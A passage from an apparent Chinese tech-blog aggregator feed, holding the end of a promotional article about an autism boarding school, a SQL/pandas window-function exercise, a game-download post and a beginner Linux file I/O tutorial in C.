验活动，激发孩子们的好奇心和探索欲，培养他们的观察力和思考力。除了专业的教育团队和丰富的课程活动，星贝育园还特别注重心理健康教育。学校设有专门的心理咨询室，为孩子们提供专业的心理咨询服务。心理咨询师们通过个别辅导、小组活动等形式，帮助孩子们认识和管理自己的情绪，增强自信心，培养积极的心态。同时，学校还注重家校合作，定期举办家长会，邀请家长参与孩子的教育过程，共同讨论孩子的成长需求和教育策略。这种紧密的合作关系，不仅增强了家长对孩子教育的参与度，也为孩子们营造了一个更加和谐、支持的家庭和学校环境。在星贝育园，孩子们的学习与成长是全方位的。学校不仅关注孩子们在学术上的进步，更重视他们在情感、社交、身体等多方面的全面发展。通过一系列富有创意和趣味性的活动，如户外探险、手工制作、体育比赛等，孩子们在探索中学习，在体验中成长，逐渐形成了积极向上的人生态度。这些宝贵的经历，不仅让孩子们学会了如何面对挑战、克服困难，更让他们学会了如何与他人建立联系、分享快乐与悲伤。星贝育园的成功，不仅体现在孩子们显著的进步上，更体现在他们脸上洋溢的自信和笑容中。在这里，每一个孩子都被赋予了无限的可能，他们学会了如何表达自己、如何与人相处、如何在逆境中寻找希望。这些宝贵的经历和能力，将成为他们未来人生道路上最坚实的基石。综上所述，广州星贝育园自闭症儿童寄宿制学校以其专业且富有爱心的教育团队、全面且富有创意的教育计划以及家校合作的紧密模式，为自闭症儿童创造了一个充满爱与希望的学习环境。虽然本文以汕头市自闭症全托管学校为引子，但星贝育园的实践无疑为我们提供了一个值得借鉴的范例，展示了如何通过专业教育和全方位支持，助力自闭症儿童实现自我超越，走向更加光明的未来。在星贝育园，每一个孩子都被视为一颗璀璨的星星，他们在这里闪耀着属于自己的光芒，向着更加美好的未来迈进。http://www.ppmy.cn/news/1540856.html相关文章SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:31 +0000</pubDate>
    </item>
    <item>
      <title>SQL数据库刷题sql_day34(移动平均值、累计求和)</title>
      <link>https://www.ppmy.cn/news/1540855.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维SQL数据库刷题sql_day34(移动平均值、累计求和)news/2025/10/31 23:18:30/描述 移动平均值1.求不同产品 每个月以及截至当前月最近3个月的平均销售额2.求不同产品截至当前月份的累计销售额数据准备mysqlCREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201801', 10159.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201802', 10211.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201803', 10247.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201804', 10376.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201805', 10400.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201806', 10565.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201807', 10613.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201808', 10696.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201809', 10751.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201810', 10842.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201811', 10900.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201812', 10972.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201901', 11155.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201902', 11202.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201903', 11260.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201904', 11341.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201905', 11459.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('苹果', '201906', 11560.00);INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201801', 10138.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201802', 10194.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201803', 10328.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201804', 10322.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201805', 10481.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201806', 10502.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201807', 10589.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201808', 10681.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201809', 10798.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201810', 10829.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201811', 10913.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201812', 11056.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201901', 11161.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201902', 11173.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201903', 11288.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201904', 11408.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201905', 11469.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('香蕉', '201906', 11528.00);INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201801', 10154.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201802', 10183.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201803', 10245.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201804', 10325.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201805', 10465.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201806', 10505.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201807', 10578.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201808', 10680.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201809', 10788.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201810', 10838.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201811', 10942.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201812', 10988.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201901', 11099.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201902', 11181.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201903', 11302.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201904', 11327.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201905', 11423.00);
INSERT INTO sales_monthly (product, ym, amount) VALUES ('桔子', '201906', 11524.00);pandasimport pandas as pd# 创建模拟数据
data = {'product': ['苹果']*18 + ['香蕉']*18 + ['桔子']*18,'ym': ['201801', '201802', '201803', '201804', '201805', '201806', '201807', '201808', '201809', '201810', '201811', '201812','201901', '201902', '201903', '201904', '201905', '201906','201801', '201802', '201803', '201804', '201805', '201806', '201807', '201808', '201809', '201810', '201811', '201812','201901', '201902', '201903', '201904', '201905', '201906','201801', '201802', '201803', '201804', '201805', '201806', '201807', '201808', '201809', '201810', '201811', '201812','201901', '201902', '201903', '201904', '201905', '201906'],'amount': [10159.00, 10211.00, 10247.00, 10376.00, 10400.00, 10565.00, 10613.00, 10696.00, 10751.00, 10842.00, 10900.00, 10972.00,11155.00, 11202.00, 11260.00, 11341.00, 11459.00, 11560.00,10138.00, 10194.00, 10328.00, 10322.00, 10481.00, 10502.00, 10589.00, 10681.00, 10798.00, 10829.00, 10913.00, 11056.00,11161.00, 11173.00, 11288.00, 11408.00, 11469.00, 11528.00,10154.00, 10183.00, 10245.00, 10325.00, 10465.00, 10505.00, 10578.00, 10680.00, 10788.00, 10838.00, 10942.00, 10988.00,11099.00, 11181.00, 11302.00, 11327.00, 11423.00, 11524.00]
}df = pd.DataFrame(data)分析三个窗口函数 实现三个功能第一个avg(amount) over(partition by product order by ym rows between 2 preceding and current row)根据product分组根据ym求平均 范围是前两行到当前行第二个avg(amount) over(partition by product order by ym rows unbounded preceding)根据product、ym分组 求截止到当月的平均金额第三个sum(amount) over(partition by product order by ym rows between unbounded preceding and current row )根据product分组 求截止到当月的总金额代码select product,amount,ym,avg(amount) over(partition by product order by ym rows between 2 preceding and current row )r1,avg(amount) over(partition by product order by ym rows unbounded preceding) r2,sum(amount) over(partition by product order by ym rows between unbounded preceding and current row ) r3
from sales_monthlydf['count'] =df.groupby(by='product')['amount'].cumcount()
df['avg1'] = df.groupby('product').apply(lambda x: x['amount'].rolling(3, min_periods=1).mean()).reset_index(level=0, drop=True)df['sum'] = df.groupby('product')['amount'].cumsum()
df['avg2'] = df['sum']/(df['count']+1)
print(df)总结①rows 是根据该行的上下行划定范围的range是根据该行的值的邻近值划定范围（所以注意格式）②pandas里的cumsum函数的积累 求累计和pands求近三行数据用rolling（window=3，min_periods=1）window：指定窗口的大小，即参与计算的连续数据点的数量。min_periods：指定窗口中至少需要有多少个非缺失值数据点才进行计算，默认为None，表示窗口大小的所有数据点都必须存在才进行计算。center：如果为True，则将窗口的标签设置为居中在当前位置。默认是窗口的右边界与当前位置对齐。win_type：指定窗口的类型，可以是各种加权窗口函数，如矩形窗、三角窗等。默认为None，表示使用等权重的矩形窗。描述查找短期之内（5天）累计转账超过100万元的账户数据准备CREATE TABLE transfer_log (log_id    int, -- 交易日志编号log_ts    TIMESTAMP NOT NULL, -- 交易时间from_user VARCHAR(50) NOT NULL, -- 交易发起账号to_user   VARCHAR(50), -- 交易接收账号type      VARCHAR(10) NOT NULL, -- 交易类型amount    float NOT NULL -- 交易金额（元），保留两位小数
);-- 插入测试数据
INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (1, '2021-01-02 10:31:40',  '62221234567890', NULL, '存款', 50000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (2, '2021-01-02 10:32:15', '62221234567890', NULL, '存款', 100000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (3, '2021-01-03 08:14:29',  '62221234567890', '62226666666666', '转账', 200000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (4, '2021-01-05 13:55:38',  '62221234567890', '62226666666666', '转账', 150000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (5, '2021-01-07 20:00:31',  '62221234567890', '62227777777777', '转账', 300000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (6, '2021-01-09 17:28:07',  '62221234567890', '62227777777777', '转账', 500000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (7, '2021-01-10 07:46:02',  '62221234567890', '62227777777777', '转账', 100000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (8, '2021-01-11 09:36:53',  '62221234567890', NULL, '存款', 40000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (9, '2021-01-12 07:10:01',  '62221234567890', '62228888888881', '转账', 10000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (10, '2021-01-12 07:11:12',  '62221234567890', '62228888888882', '转账', 8000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (11, '2021-01-12 07:12:36',  '62221234567890', '62228888888883', '转账', 5000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (12, '2021-01-12 07:13:55',  '62221234567890', '62228888888884', '转账', 6000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (13, '2021-01-12 07:14:24',  '62221234567890', '62228888888885', '转账', 7000);INSERT INTO transfer_log (log_id, log_ts, from_user, to_user, type, amount)
VALUES (14, '2021-01-21 12:11:16',  '62221234567890', '62228888888885', '转账', 70000);分析通过sum(amount) over (partition by from_user order by log_ts range interval 5 day preceding)即可求出最近五天的总额代码with t1 as (select *,sum(amount) over (partition by from_user order by log_ts range interval 5 day preceding) r2from transfer_logwhere type = '转账')select *from t1where r2 &gt; 1000000;http://www.ppmy.cn/news/1540855.html相关文章植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:30 +0000</pubDate>
    </item>
    <item>
      <title>植物大战僵尸杂交版游戏分享</title>
      <link>https://www.ppmy.cn/news/1540854.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维植物大战僵尸杂交版游戏分享news/2025/10/31 23:18:29/植物大战僵尸杂交版游戏下载：夸克网盘分享无捆绑之类的隐形消费，下载即玩http://www.ppmy.cn/news/1540854.html相关文章Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:29 +0000</pubDate>
    </item>
    <item>
      <title>Linux系统基础-文件系统</title>
      <link>https://www.ppmy.cn/news/1540853.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Linux系统基础-文件系统news/2025/10/31 23:18:28/个人主页：C++忠实粉丝欢迎 点赞👍 收藏✨ 留言✉ 加关注💓本文由 C++忠实粉丝 原创Linux系统基础-文件系统收录于专栏[Linux学习]本专栏旨在分享学习Linux的一点学习笔记，欢迎大家在评论区交流讨论💌目录1. 回顾C语言文件接口hello.c 写文件hello.c 读文件输出信息到显示器stdin &amp; stdout &amp; stderr总结2. 系统文件IOhello.c写文件hello.c读文件系统接口介绍open需要的头文件:方法:参数:返回值系统调用和库函数3. 文件描述符fd0 &amp; 1 &amp; 2文件系统结构初步了解文件描述符的分配规则重定向1. &gt; (输出重定向)2. &gt;&gt; (追加重定向)3. &lt; (输入重定向)4. FILE结构体5. 理解文件系统​编辑Linux ext2文件系统硬链接硬链接的应用:软连接软连接的应用:1. 回顾C语言文件接口hello.c 写文件#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main()
{FILE *fp = fopen("myfile", "w");if(!fp) printf("fopen error!\n");const char* msg = "hello C programming language";int count = 5;while(count--) fwrite(msg, strlen(msg), 1, fp);fclose(fp);return 0;
}FILE *fp：定义一个指向 FILE 结构的指针 fp，用于处理文件操作。fopen("myfile", "w")：尝试以写入模式（"w"）打开名为 "myfile" 的文件。如果文件不存在，fopen 会创建一个新的空文件。如果文件已经存在，内容会被清空。fwrite(msg, strlen(msg), 1, fp)：msg：要写入的内容。strlen(msg)：要写入的字节数（字符串的长度）。1：要写入的块数。fp：目标文件指针。使用fclose(fp)关闭打开的文件，确保所有缓存的内容被写入磁盘，并释放系统资源。运行结果:注意 :在C/C++编程中, 如果打开一个文件后不调用fclose()来关闭它, 可能会导致一下集中后果:1. 资源泄露'没打开一个文件, 操作系统都会分配一定的资源(如文件句柄或文件描述符). 如果不关闭文件, 系统的资源将持续占用, 最终可能导致资源耗尽, 无法打开新的文件或进行其他操作, 这种情况在长时间运行的程序或需要频繁打开文件的程序中特别明显(一旦发现, 后果不堪设想~)2. 数据末写入文件通常会使用缓冲区来提高写入效率, 在调用fwrite(), fprintf() 等函数时, 数据首先被写入到内存缓冲区中, 而不是立即写入文件, 如果程序在未调用fclose()的情况下终止(例如, 异常, 崩溃或使用exit()), 缓冲区中的数据可能不会被写入到文件中, 从而导致数据丢失~hello.c 读文件int main()
{FILE* fp = fopen("myfile", "r");if(!fp) printf("fopen error!\n");char buf[1024];const char * msg = "hello linux!\n";while(1){size_t s = fread(buf, 1, strlen(msg), fp);if(s &gt; 0){buf[s] = 0;printf("%s", buf);}if(feof(fp)) break;}fclose(fp);return 0;
}使用fopen函数以只读模式（"r"）打开名为 "myfile" 的文件。如果文件打开失败（如文件不存在），fopen 将返回 NULL，程序会打印错误信息。while(1) 创建一个无限循环。使用fread函数从文件中读取数据：第一个参数是目标缓冲区 buf，第二个参数是每次读取的字节大小（1），第三个参数是要读取的字节数（这里是 strlen(msg)，即 13 字节）。如果 fread 成功读取到数据，则 s 将大于 0。通过 buf[s] = 0; 将读取的数据结尾标志设置为 '\0'，以确保后续的 printf 函数正确打印字符串。然后使用 printf 输出读取到的内容。使用feof(fp)检查文件是否结束，如果是，则跳出循环。最后关闭打开的文件，释放系统资源。结果展示:可以看到, 已经将我们之前写入文件的信息全部打印出来了~输出信息到显示器#include &lt;stdio.h&gt;
#include &lt;string.h&gt;int main()
{const char *msg = "hello fwrite\n";fwrite(msg, strlen(msg), 1, stdout);printf("hello printf\n");fprintf(stdout, "hello fprintf\n");return 0;
}fwrite函数用于从内存块写入数据到文件或输出流。第一个参数是待写入的内存地址，这里是 msg。第二个参数是每个元素的大小，这里是 strlen(msg)，表示字符串的长度（即 14 字节，包括换行符）。第三个参数是要写入的元素个数，这里为 1，表示写入一个块。第四个参数是目标输出流，这里是 stdout，标准输出。printf是一个格式化输出函数，输出字符串 "hello printf\n" 到标准输出。fprintf是一个格式化输出函数，功能与 printf 类似，但可以将输出写入指定的文件流。第一个参数是目标输出流，这里为 stdout，第二个参数是待输出的字符串。这行代码的效果与 printf 相同，即将字符串 "hello fprintf\n" 输出到标准输出。结果展示:stdin &amp; stdout &amp; stderrC默认会打开三个输入输出流，分别是stdin, stdout, stderr仔细观察发现，这三个流的类型都是FILE*, fopen返回值类型，文件指针我们可以使用man手册直接在linux中查看:总结打开文件的方式:r      Open text file for reading.  The stream is positioned at the beginning of the file.r+     Open for reading and writing.  The stream is positioned at the beginning of the file.w      Truncate file to zero length or create text file for writing.  The stream is positioned at the beginning of the file.w+     Open for reading and writing.  The file is created if it does not exist, otherwise it is truncated.  The stream is positioned at the beginning of the file.a      Open for appending (writing at end of file).  The file is created if it does not exist.  The stream is positioned at the end of the file.a+     Open  for reading and appending (writing at end of file).  The file is created if it 